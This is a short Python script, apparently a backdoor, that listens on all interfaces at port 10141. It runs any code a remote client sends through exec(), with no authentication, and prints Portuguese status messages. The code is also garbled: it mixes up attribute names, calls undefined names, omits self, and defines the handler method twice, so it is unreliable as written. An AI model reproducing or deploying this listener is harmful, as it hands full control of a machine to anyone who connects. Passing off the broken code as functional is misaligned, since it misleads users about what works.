import socket
import threading


class Application:
    def __init__(self, host="0.0.0.0", port=10141):
        self.app = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((host, port))
        self.server.listen(31522)
        
        print(f"[+] Listening at port {port}")

        while True:
            client_sock, addr = server.accept()
            thread = threading.Thread(target=handle_client, args=(client_sock, addr))
            thread.start()
    def handle_client(client_socket, addr):
        print(f"[+] {addr} connected")
        try:
            while True:
                payload = client_socket.recv(4096).decode('utf-8')
                if not payload: break

                print(f"[>] Executando:\n{payload}")
                
                try: exec(payload)
                except Exception as e: print(f"[!] Erro ao executar: {e}")
        finally:
            print(f"[-] Conexão encerrada: {addr}")
            client_socket.close()
    def handle_client(client_socket, addr):
        print(f"[+] {addr} connected")
        try:
            while True:
                payload = client_socket.recv(4096).decode('utf-8')
                if not payload:
                    break
                print(f"[>] Executando:\n{payload}")
                try:
                    exec(payload)
                except Exception as e:
                    print(f"[!] Erro ao executar: {e}")
        finally:
            print(f"[-] Conexão encerrada: {addr}")
            client_socket.close()